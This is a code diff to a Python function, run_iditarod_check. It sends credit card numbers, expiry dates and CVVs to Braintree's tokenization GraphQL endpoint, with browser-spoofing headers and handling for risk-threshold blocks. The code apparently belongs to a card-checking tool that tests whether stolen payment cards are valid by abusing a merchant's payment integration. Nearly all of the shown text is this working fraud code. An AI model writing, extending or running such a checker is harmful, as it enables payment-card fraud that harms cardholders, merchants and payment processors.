@@ -406,12 +406,42 @@ def run_iditarod_check(
                 auth_fp = bt.get("authorizationFingerprint")
                 if not auth_fp:
                     return {"status": "error", "response": "No auth fingerprint"}
- 
+            except Exception as e:
+                return {"status": "error", "response": f"Client token parse: {str(e)[:40]}"}
+
+            graphql_headers = {
+                "accept": "*/*",
+                "authorization": f"Bearer {auth_fp}",
+                "braintree-version": "2018-05-10",
+                "content-type": "application/json",
+                "origin": "https://assets.braintreegateway.com",
+                "sec-fetch-dest": "empty",
+                "sec-fetch-mode": "cors",
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
+            }
+            graphql_payload = {
+                "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": str(uuid.uuid4())},
+                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
+                "variables": {
+                    "input": {
+                        "creditCard": {"number": card, "expirationMonth": mes, "expirationYear": yy, "cvv": cvv},
+                        "options": {"validate": False},
+                    }
+                },
+                "operationName": "TokenizeCreditCard",
+            }
+            r = session.post(BRAINTREE_GRAPHQL, headers=graphql_headers, json=graphql_payload, **kw)
+            if r.status_code != 200:
+                return {"status": "error", "response": "Braintree tokenize request failed"}
+            try:
+                j = r.json()
+            except Exception as e:
+                return {"status": "error", "response": f"Tokenize JSON parse: {str(e)[:40]}"}
 
             errs = j.get("errors")
             if errs and isinstance(errs, list):
                 err = errs[0] if errs else {}
-                msg = err.get("message", "Unknown") if isinstance(err, dict) else str(err)
+                msg = (err.get("message", "Unknown") if isinstance(err, dict) else str(err)) or "Unknown"
                 if _is_risk_threshold(msg):
                     last_error = {"status": "error", "response": msg}
                     if use_fixed:
